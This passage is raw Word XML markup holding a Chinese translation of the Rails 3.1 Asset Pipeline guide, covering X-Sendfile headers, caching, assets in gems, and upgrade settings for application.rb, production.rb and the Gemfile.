      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D520C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它可以被改成其它的：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="324828A1" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2857258C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2078015710"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.assets.prefix = "/some_other_path"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="154B67E1"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5.5 X-Sendfile Headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08DCEFD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X-Sendfile 头部是 web 服务器的一个指令,用于忽略来自应用程序的回应(response)而是提供磁盘里的指定文件. 这个选项默认是关闭的, 但也可以被开启,如果你的服务器支持它. 当开启时, 这将负责把文件提供给 web 服务器, 而且更快.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE9E16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Apache 和 nginx 支持这个选项, 这可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/environments/production.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里被开启.</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1C0F0ACD" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D79CFA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config.action_dispatch.x_sendfile_header = "X-Sendfile" # for apache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1520880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config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # for nginx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="081E0BE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如果你升级一个已有的应用程序并且想使用这个选项, 务必只将这个配置选项粘贴进 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>production.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和任何其它被定义为生产行为的环境 (不是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BC5872"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6 如何缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B99BC9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Sprockets 使用 Rails 默认的缓存存储去在开发和生产环境中缓存资源.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E5E3E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TODO: Add more about changing the defualt store.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2563C033"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7 为你的 Gems 添加资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED1245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资源也来自外部源,以 gems 的形式.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="386CFAB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一个很好的例子就是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>jquery-rails</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem, 它来自 Rails 标准的 JavaScript 函式库 gem. 这个 gem 包含了一个继承了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 engine 类. 通过这么做, Rails 被告知这个 gem 的目录会包含资源, 然后这个 engine 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>vendor/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录会被添加到 Sprockets 的搜索路径里.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DA62B1"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8 为你的函式库或者 Gem 做一个预处理器.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20090CF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TODO: Registering gems on </w:t>
      </w:r>
      <w:hyperlink r:id="rId971" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Tilt</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> enabling Sprockets to find them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1642884B"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9 从旧的 Rails 版本升级</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117359B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升级又两个步骤. 第一是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public/</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的文件移动到新的位置. 查阅上面的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId972" w:anchor="asset-organization" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Asset Organization</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为指导, 将不同格式的文件放放置到正确的位置.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1144E13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第二是升级各种环境文件, 设置正确的默认选项. 下面的变更反映了 3.1.0 版本的默认值.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A802BB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 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里:</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7D133236" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="421991D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Enable the asset pipeline</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69FD1C8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config.assets.enabled = true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E3C5A0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5C57C45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Version of your assets, change this if you want to expire all your assets</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E13539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config.assets.version = '1.0'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="367A542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0DFAE13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Change the path that assets are served from</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C9DCEC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config.assets.prefix = "/assets"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="647A342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 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>development.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="23037C5E" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F30BE9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Do not compress assets</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C0BDC8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config.assets.compress = false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E17F9A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78D2BC3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Expands the lines which load the assets</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="478A62F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config.assets.debug = true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="57C6E56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还有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>production.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">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7D21E50E" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="045CB18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Compress JavaScripts and CSS</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7312AE6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config.assets.compress = true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EBA828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442D994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Choose the compressors to use</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="245D3F4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config.assets.js_compressor  = :uglifier</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2850AF5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config.assets.css_compressor = :yui</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A63EA8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26285CC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Don't fallback to assets pipeline if a precompiled asset is missed</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="757B6F0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config.assets.compile = false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B5EE5E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22A7066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Generate digests for assets URLs.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CAE0A7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config.assets.digest = true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BD5528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01CBB4E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Defaults to nil and saved in location specified by config.assets.prefix</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EE89E3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config.assets.manifest = YOUR_PATH</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D09C38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3A9FCB7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Precompile additional assets (application.js, application.css, and all non-JS/CSS are already added)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F4D8CD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config.assets.precompile += %w( search.js )</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="185D441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你不应该改变 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 测试环境中的默认值是: </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.compile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.compress</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.debug</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.digest</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 false.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D09354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这些要被加入到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="029E4200" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="754E2E0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Gems used only for assets and not required</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53497E3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in production environments by default.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="457BE78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group :assets do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D6F422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gem 'sass-rails',   "~&gt; 3.1.0"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7049868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gem 'coffee-rails', "~&gt; 3.1.0"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FBB5B1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gem 'uglifier'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61A1434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0C56B99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如果你的 Bundler 使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 组, 请确认 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 有下列需求声明:</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77DB4DD8" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="761B9E0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if</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>defined?(Bundler)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C8AECF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If you precompile assets before deploying to production, use this line</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18B0CC4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Bundler.require *Rails.groups(:assets</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; %w(development test))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51992A1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If you want your assets lazily compiled in production, use this line</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BEF8E1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Bundler.require(:default, :assets, Rails.env)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="302ADFD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33463D8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而在旧的 3.0 版本是这样的:</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32DB1AD2" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28B3007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If you have a Gemfile, require the gems listed there, including any gems</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7624C2D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you've limited to :test, :development, or :production.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B52CEF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Bundler.require(:default, Rails.env) if</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>defined?(Bundler)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AA0C794" w14:textId="1D950682" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.12、</w:t>
      </w:r>
      <w:hyperlink r:id="rId973" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
